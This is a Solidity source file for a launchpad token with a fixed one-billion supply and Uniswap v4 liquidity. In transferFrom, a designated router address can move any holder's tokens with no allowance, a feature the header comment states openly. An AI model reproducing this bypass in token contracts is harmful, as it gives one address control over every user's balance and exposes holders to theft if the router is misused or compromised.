// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

/// @title Trendypad token
/// Fixed 1B supply minted to the pad that launched it, which puts all of it into Uniswap v4 liquidity in the same
/// transaction. The Trendypad router moves tokens without an allowance, so selling takes one transaction.
contract TrendyToken {
    uint256 public constant totalSupply = 1e27;
    uint8 public constant decimals = 18;

    string public name;
    string public symbol;
    string public metadataURI;
    address public pad;
    address public router;
    address public creator;
    uint64 public createdAt;
    bool internal initialized;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor() {
        initialized = true;
    }

    function initialize(string calldata _name, string calldata _symbol, string calldata _uri, address _router, address _creator) external {
        require(!initialized, "init");
        initialized = true;
        pad = msg.sender;
        name = _name;
        symbol = _symbol;
        metadataURI = _uri;
        router = _router;
        creator = _creator;
        createdAt = uint64(block.timestamp);
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        if (msg.sender != router) {
            uint256 a = allowance[from][msg.sender];
            if (a != type(uint256).max) {
                require(a >= amount, "allowance");
                allowance[from][msg.sender] = a - amount;
            }
        }
        _transfer(from, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(to != address(0), "to");
        uint256 b = balanceOf[from];
        require(b >= amount, "balance");
        unchecked { balanceOf[from] = b - amount; }
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
    }
}
